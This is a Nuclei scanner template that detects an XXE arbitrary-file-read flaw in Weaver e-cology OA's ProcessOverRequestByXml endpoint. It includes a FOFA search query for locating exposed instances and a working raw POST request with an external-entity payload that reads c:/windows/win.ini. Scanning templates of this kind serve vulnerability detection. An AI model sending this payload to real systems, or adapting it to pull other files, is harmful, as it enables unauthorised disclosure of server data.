id: weaver-ecology-ProcessOverRequestByXml-xxe
info:
  name: 泛微 OA E-Cology ProcessOverRequestByXml - xxe
  author: leadlife
  severity: high
  description: 泛微e-cology-ProcessOverRequestByXml接口存在任意文件读取漏洞
  reference: 
    - https://wiki.wy876.cn/#/%E6%B3%9B%E5%BE%AEe-cology-ProcessOverRequestByXml%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="/js/ecology8" || body="wui/common/css/w7OVFont_wev8.css" || (body="weaver" && body="ecology") || (header="ecology_JSessionId" && body="login/Login.jsp") || body="/wui/index.html" || body="jquery_wev8" && body="/login/Login.jsp?logintype=1"
  tags: weaver,ecology,oa,xxe

http:
  - raw:
      - |
        POST /rest/ofs/ProcessOverRequestByXml HTTP/1.1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Host: {{Hostname}}
        Content-Type: application/xml
        Content-Length: 146

        <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'font','extension')
        condition: and